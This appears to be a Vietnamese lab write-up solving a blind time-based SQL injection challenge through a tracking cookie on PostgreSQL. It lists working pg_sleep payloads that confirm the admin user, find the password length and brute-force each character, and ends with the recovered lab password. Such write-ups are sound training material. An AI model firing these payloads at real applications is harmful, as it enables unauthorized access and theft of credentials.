<img width="2093" height="1366" alt="image" src="https://github.com/user-attachments/assets/ded001a6-53c5-4f3c-bd0c-f896cf8ce21e" /><img width="1528" height="853" alt="image" src="https://github.com/user-attachments/assets/21ea76bc-d3b5-4695-b90c-834c402c76e7" />

Yêu cầu: login bằng administrator account từ bảng users

Gợi ý: có thể thực thi được SQL query ở Tracking Cookie, kết quả query sẽ không được trả về và server cũng sẽ không thay đổi gì dù query có trả về bất kỳ row nào hoặc là gây ra lỗi gì đó.

Vậy nếu biết là tracking cookie có thể thực thi được query rồi vậy thì ta có thể làm nó bị delay để xác định chính xác nó có thực thi được query hay không?

<img width="2563" height="1374" alt="image" src="https://github.com/user-attachments/assets/70a7be1d-b36a-49b3-950f-d5eca631d72c" />

Thì sau khi thử từng query của từng loại database thì ta thấy query này của PostgreSQL đã thành công khiến sever delay 10s:

    '||pg_sleep(10)||'

<img width="2563" height="1361" alt="image" src="https://github.com/user-attachments/assets/32abc61c-cba4-4f63-8214-b51fc168dac7" />

Tiếp theo dựa vào thời gian này để làm hành động thực thi cho `Coditional Logic` thì sẽ thành:

    '||(SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END)||'

Ban đầu ta sẽ dùng các điều kiện dễ để xem payload có hoạt động hay không như `1=1` hay `1=2`

<img width="2304" height="1340" alt="image" src="https://github.com/user-attachments/assets/e8a05e7b-bf25-4d4b-b179-dfdf05322efa" />

Nếu điều kiện đúng thì ta thấy được load khá lâu nhưng nếu sai thì trả về luôn.

Tiếp đến là ta sẽ thay đổi điều kiện để phục vụ mục đích khai thác ra password của `administrator`.

    '||(SELECT CASE WHEN (SELECT 'a' FROM users WHERE username = 'administrator') = 'a' THEN pg_sleep(10) ELSE pg_sleep(0) END)||'

<img width="2093" height="1366" alt="image" src="https://github.com/user-attachments/assets/94c9a0f7-d9d4-43ae-931d-74c37f43ed05" />

Ở đây thấy đã bị bị delay do đó có user `administrator` trong bảng `users` tiếp đến là xác định độ dài của password.

    '||(SELECT CASE WHEN (SELECT LENGTH(password) FROM users WHERE username = 'administrator') > 1 THEN pg_sleep(10) ELSE pg_sleep(0) END)||'

<img width="2091" height="1423" alt="image" src="https://github.com/user-attachments/assets/560baf2c-87d3-4114-897e-52db970a10be" />

Server load khá lâu do đó độ dài password lớn hơn 1, ta tiếp tục thử cho tới khi độ dài bằng 20 thì không còn bị delay nữa do đó password bằng 20.

Tiếp đến là ta sẽ brute force từng ký tự trong password để lấy password hoàn chỉnh.

    '||(SELECT CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'administrator') = 'variable' THEN pg_sleep(10) ELSE pg_sleep(0) END)||'

Để tránh bị thời gian delay đè lên nhau thì ta sẽ cho chạy đơn luồng.

<img width="2553" height="1443" alt="image" src="https://github.com/user-attachments/assets/93fe96ca-0838-40b9-aa23-8565494d2fe7" />

Ở đây ta phát hiện ra ký tự `i` có thời gian trả về lâu hơn vậy ký tự đầu tiên là `i`.

Ta tiếp tục thử cho tới ký tự cuối ta được password là `ihp6cioururug9bsoqlj`

<img width="2556" height="1443" alt="image" src="https://github.com/user-attachments/assets/8a5a2b65-71e3-4212-9b72-0780000359b1" />

Đã thành công đăng nhập vào `administrator` account.
